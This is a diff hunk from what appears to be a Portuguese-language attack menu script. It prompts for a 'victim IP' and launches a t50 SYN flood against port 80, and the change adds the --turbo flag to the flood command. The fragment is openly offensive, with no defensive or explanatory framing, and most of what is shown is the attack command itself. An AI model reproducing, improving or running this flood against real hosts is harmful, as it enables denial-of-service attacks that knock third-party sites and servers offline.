@@ -30,7 +30,7 @@ case $opcao in
  make && make install /dev/null 2> /dev/null
  echo "Digite ip da vitima"
  read -p ": " ip
- t50 $ip --flood -S --flood --dport 80;;
+ t50 $ip --flood -S --turbo --dport 80;;
 5)
  echo "Digite o site"
  read -p ": " site
